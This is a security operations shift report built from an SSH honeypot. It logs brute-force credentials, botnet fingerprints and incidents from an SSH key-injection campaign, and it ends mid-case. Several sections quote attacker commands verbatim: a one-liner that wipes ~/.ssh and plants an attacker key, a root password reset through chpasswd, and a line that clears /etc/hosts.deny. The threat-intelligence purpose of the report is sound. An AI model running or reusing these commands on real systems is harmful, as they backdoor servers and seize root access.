# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-04 |
| **Generated At** | 2026-06-04T23:12:35Z |
| **Shift Time** | 23:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **129** |
| Confirmed Threats | **124** |
| False Positives Filtered | **5** (3.9%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **13** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **102** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **69** |
| Unique Credential Pairs | **43** |
| Unique Usernames | **29** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 27 |
| `345gs5662d34` | 14 |
| `user` | 2 |
| `atl` | 1 |
| `ubuntu` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 13 |
| `123456` | 5 |
| `123` | 3 |
| `password` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 13 |
| `root` | `12345Qwerty` | 2 |
| `root` | `admin2022@` | 1 |
| `atl` | `123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin2022@` | `58.186.20.143` | 2026-06-04T20:18:42 |
| `root` | `3245gs5662d34` | `58.186.20.143` | 2026-06-04T20:18:45 |
| `root` | `bruno123` | `43.165.62.10` | 2026-06-04T21:06:26 |
| `root` | `3245gs5662d34` | `43.165.62.10` | 2026-06-04T21:06:29 |
| `root` | `Lq123456` | `189.8.5.118` | 2026-06-04T21:17:33 |
| `root` | `3245gs5662d34` | `189.8.5.118` | 2026-06-04T21:17:41 |
| `root` | `12345Qwerty` | `182.44.116.87` | 2026-06-04T21:17:53 |
| `root` | `QWE!@#qwe123` | `189.8.5.118` | 2026-06-04T21:28:19 |
| `root` | `12345Qwerty` | `189.8.5.118` | 2026-06-04T21:39:10 |
| `root` | `123abc,.` | `189.8.5.118` | 2026-06-04T21:47:52 |
| `root` | `0213` | `189.8.5.118` | 2026-06-04T21:50:04 |
| `root` | `zw123456!` | `189.8.5.118` | 2026-06-04T21:56:35 |
| `root` | `Server@1` | `189.8.5.118` | 2026-06-04T22:00:51 |
| `root` | `root888` | `189.8.5.118` | 2026-06-04T22:07:27 |
| `root` | `Automation@123` | `189.8.5.118` | 2026-06-04T22:09:36 |
| `root` | `Password!!` | `163.7.4.169` | 2026-06-04T23:02:29 |
| `root` | `3245gs5662d34` | `163.7.4.169` | 2026-06-04T23:02:31 |
| `root` | `spartak` | `68.220.171.40` | 2026-06-04T23:02:57 |
| `root` | `3245gs5662d34` | `68.220.171.40` | 2026-06-04T23:03:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **129** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 78 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 66 | 8 |
| `af8223ac9914...` | libssh-based | 4 | 1 |
| `03a80b21afa8...` | Modern SSH client | 4 | 2 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `bc3aee897af7...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 66 | 8 | Mirai/variant |
| `af8223ac9914...` | libssh | 4 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 4 | 2 | — |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `bc3aee897af7...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:FWnKOSW2uvfS"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `182.44.116.87`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `163.7.4.169`, `58.186.20.143`, `189.8.5.118`, `68.220.171.40`, `43.165.62.10`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **20** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS58519` | Cloud Computing Corporation | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS140810` | Megacore Technology Company Limited | 1 | HIGH |
| `AS263717` | SOL TELECOMUNICACIONES S.A. | 1 | LOW |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS26609` | Universal Telecom S.A. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c4c5cdda2bf3

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]143` |
| **First Seen** | 2026-06-04 20:18 |
| **Last Seen** | 2026-06-04 20:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 20:18:41` | `cowrie.session.connect` |
| `2026-06-04 20:18:41` | `cowrie.client.version` |
| `2026-06-04 20:18:41` | `cowrie.client.kex` |
| `2026-06-04 20:18:42` | `cowrie.login.success` |
| `2026-06-04 20:18:42` | `cowrie.session.params` |
| `2026-06-04 20:18:42` | `cowrie.command.input` |
| `2026-06-04 20:18:42` | `cowrie.command.failed` |
| `2026-06-04 20:18:42` | `cowrie.log.closed` |
| `2026-06-04 20:18:42` | `cowrie.session.params` |
| `2026-06-04 20:18:42` | `cowrie.command.input` |
| `2026-06-04 20:18:42` | `cowrie.session.file_download` |
| `2026-06-04 20:18:42` | `cowrie.log.closed` |
| `2026-06-04 20:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]143` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63a2cdd5d1c7

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]143` |
| **First Seen** | 2026-06-04 20:18 |
| **Last Seen** | 2026-06-04 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 20:18:44` | `cowrie.session.connect` |
| `2026-06-04 20:18:44` | `cowrie.client.version` |
| `2026-06-04 20:18:44` | `cowrie.client.kex` |
| `2026-06-04 20:18:45` | `cowrie.login.success` |
| `2026-06-04 20:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]143` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-979963967e6e

| Field | Detail |
|---|---|
| **Source IP** | `43.165.62[.]10` |
| **First Seen** | 2026-06-04 21:06 |
| **Last Seen** | 2026-06-04 21:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:06:25` | `cowrie.session.connect` |
| `2026-06-04 21:06:25` | `cowrie.client.version` |
| `2026-06-04 21:06:25` | `cowrie.client.kex` |
| `2026-06-04 21:06:26` | `cowrie.login.success` |
| `2026-06-04 21:06:26` | `cowrie.session.params` |
| `2026-06-04 21:06:26` | `cowrie.command.input` |
| `2026-06-04 21:06:26` | `cowrie.command.failed` |
| `2026-06-04 21:06:26` | `cowrie.log.closed` |
| `2026-06-04 21:06:27` | `cowrie.session.params` |
| `2026-06-04 21:06:27` | `cowrie.command.input` |
| `2026-06-04 21:06:27` | `cowrie.session.file_download` |
| `2026-06-04 21:06:27` | `cowrie.log.closed` |
| `2026-06-04 21:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.62[.]10` to AbuseIPDB if not already reported
- [ ] Block `43.165.62[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3f5d38a7143

| Field | Detail |
|---|---|
| **Source IP** | `43.165.62[.]10` |
| **First Seen** | 2026-06-04 21:06 |
| **Last Seen** | 2026-06-04 21:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:06:29` | `cowrie.session.connect` |
| `2026-06-04 21:06:29` | `cowrie.client.version` |
| `2026-06-04 21:06:29` | `cowrie.client.kex` |
| `2026-06-04 21:06:29` | `cowrie.login.success` |
| `2026-06-04 21:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.62[.]10` to AbuseIPDB if not already reported
- [ ] Block `43.165.62[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-368ac07c6c94

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:17 |
| **Last Seen** | 2026-06-04 21:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:17:31` | `cowrie.session.connect` |
| `2026-06-04 21:17:31` | `cowrie.client.version` |
| `2026-06-04 21:17:31` | `cowrie.client.kex` |
| `2026-06-04 21:17:33` | `cowrie.login.success` |
| `2026-06-04 21:17:33` | `cowrie.session.params` |
| `2026-06-04 21:17:33` | `cowrie.command.input` |
| `2026-06-04 21:17:33` | `cowrie.command.failed` |
| `2026-06-04 21:17:34` | `cowrie.log.closed` |
| `2026-06-04 21:17:34` | `cowrie.session.params` |
| `2026-06-04 21:17:34` | `cowrie.command.input` |
| `2026-06-04 21:17:35` | `cowrie.session.file_download` |
| `2026-06-04 21:17:35` | `cowrie.log.closed` |
| `2026-06-04 21:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70efcacf5bd8

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:17 |
| **Last Seen** | 2026-06-04 21:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:17:40` | `cowrie.session.connect` |
| `2026-06-04 21:17:40` | `cowrie.client.version` |
| `2026-06-04 21:17:40` | `cowrie.client.kex` |
| `2026-06-04 21:17:41` | `cowrie.login.success` |
| `2026-06-04 21:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcc8b9348bc5

| Field | Detail |
|---|---|
| **Source IP** | `182.44.116[.]87` |
| **First Seen** | 2026-06-04 21:17 |
| **Last Seen** | 2026-06-04 21:18 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:FWnKOSW2uvfS"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:17:52` | `cowrie.session.connect` |
| `2026-06-04 21:17:52` | `cowrie.client.version` |
| `2026-06-04 21:17:52` | `cowrie.client.kex` |
| `2026-06-04 21:17:53` | `cowrie.login.success` |
| `2026-06-04 21:17:53` | `cowrie.session.params` |
| `2026-06-04 21:17:53` | `cowrie.command.input` |
| `2026-06-04 21:17:53` | `cowrie.command.failed` |
| `2026-06-04 21:17:53` | `cowrie.log.closed` |
| `2026-06-04 21:17:53` | `cowrie.session.params` |
| `2026-06-04 21:17:53` | `cowrie.command.input` |
| `2026-06-04 21:17:53` | `cowrie.session.file_download` |
| `2026-06-04 21:17:53` | `cowrie.log.closed` |
| `2026-06-04 21:18:10` | `cowrie.session.params` |
| `2026-06-04 21:18:10` | `cowrie.command.input` |
| `2026-06-04 21:18:10` | `cowrie.log.closed` |
| `2026-06-04 21:18:10` | `cowrie.session.params` |
| `2026-06-04 21:18:10` | `cowrie.command.input` |
| `2026-06-04 21:18:10` | `cowrie.log.closed` |
| `2026-06-04 21:18:10` | `cowrie.session.params` |
| `2026-06-04 21:18:10` | `cowrie.command.input` |
| `2026-06-04 21:18:11` | `cowrie.session.file_download` |
| `2026-06-04 21:18:11` | `cowrie.log.closed` |
| `2026-06-04 21:18:11` | `cowrie.session.params` |
| `2026-06-04 21:18:11` | `cowrie.command.input` |
| `2026-06-04 21:18:11` | `cowrie.log.closed` |
| `2026-06-04 21:18:11` | `cowrie.session.params` |
| `2026-06-04 21:18:11` | `cowrie.command.input` |
| `2026-06-04 21:18:12` | `cowrie.log.closed` |
| `2026-06-04 21:18:12` | `cowrie.session.params` |
| `2026-06-04 21:18:12` | `cowrie.command.input` |
| `2026-06-04 21:18:12` | `cowrie.command.input` |
| `2026-06-04 21:18:12` | `cowrie.log.closed` |
| `2026-06-04 21:18:12` | `cowrie.session.params` |
| `2026-06-04 21:18:12` | `cowrie.command.input` |
| `2026-06-04 21:18:13` | `cowrie.log.closed` |
| `2026-06-04 21:18:13` | `cowrie.session.params` |
| `2026-06-04 21:18:13` | `cowrie.command.input` |
| `2026-06-04 21:18:13` | `cowrie.log.closed` |
| `2026-06-04 21:18:13` | `cowrie.session.params` |
| `2026-06-04 21:18:13` | `cowrie.command.input` |
| `2026-06-04 21:18:13` | `cowrie.log.closed` |
| `2026-06-04 21:18:14` | `cowrie.session.params` |
| `2026-06-04 21:18:14` | `cowrie.command.input` |
| `2026-06-04 21:18:14` | `cowrie.log.closed` |
| `2026-06-04 21:18:14` | `cowrie.session.params` |
| `2026-06-04 21:18:14` | `cowrie.command.input` |
| `2026-06-04 21:18:14` | `cowrie.log.closed` |
| `2026-06-04 21:18:15` | `cowrie.session.params` |
| `2026-06-04 21:18:15` | `cowrie.command.input` |
| `2026-06-04 21:18:15` | `cowrie.log.closed` |
| `2026-06-04 21:18:15` | `cowrie.session.params` |
| `2026-06-04 21:18:15` | `cowrie.command.input` |
| `2026-06-04 21:18:15` | `cowrie.log.closed` |
| `2026-06-04 21:18:15` | `cowrie.session.params` |
| `2026-06-04 21:18:15` | `cowrie.command.input` |
| `2026-06-04 21:18:16` | `cowrie.log.closed` |
| `2026-06-04 21:18:16` | `cowrie.session.params` |
| `2026-06-04 21:18:16` | `cowrie.command.input` |
| `2026-06-04 21:18:16` | `cowrie.log.closed` |
| `2026-06-04 21:18:16` | `cowrie.session.params` |
| `2026-06-04 21:18:16` | `cowrie.command.input` |
| `2026-06-04 21:18:16` | `cowrie.log.closed` |
| `2026-06-04 21:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.44.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `182.44.116[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cb90a694d9c

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:28 |
| **Last Seen** | 2026-06-04 21:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:28:18` | `cowrie.session.connect` |
| `2026-06-04 21:28:18` | `cowrie.client.version` |
| `2026-06-04 21:28:18` | `cowrie.client.kex` |
| `2026-06-04 21:28:19` | `cowrie.login.success` |
| `2026-06-04 21:28:20` | `cowrie.session.params` |
| `2026-06-04 21:28:20` | `cowrie.command.input` |
| `2026-06-04 21:28:20` | `cowrie.command.failed` |
| `2026-06-04 21:28:21` | `cowrie.log.closed` |
| `2026-06-04 21:28:21` | `cowrie.session.params` |
| `2026-06-04 21:28:21` | `cowrie.command.input` |
| `2026-06-04 21:28:21` | `cowrie.session.file_download` |
| `2026-06-04 21:28:21` | `cowrie.log.closed` |
| `2026-06-04 21:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-346c04400eff

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:28 |
| **Last Seen** | 2026-06-04 21:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 21:28:25` | `cowrie.session.connect` |
| `2026-06-04 21:28:25` | `cowrie.client.version` |
| `2026-06-04 21:28:25` | `cowrie.client.kex` |
| `2026-06-04 21:28:27` | `cowrie.login.success` |
| `2026-06-04 21:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.8.5[.]118` to AbuseIPDB if not already reported
- [ ] Block `189.8.5[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eebe3ea45a3

| Field | Detail |
|---|---|
| **Source IP** | `189.8.5[.]118` |
| **First Seen** | 2026-06-04 21:39 |
| **Last Seen** | 2026-06-04 21:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
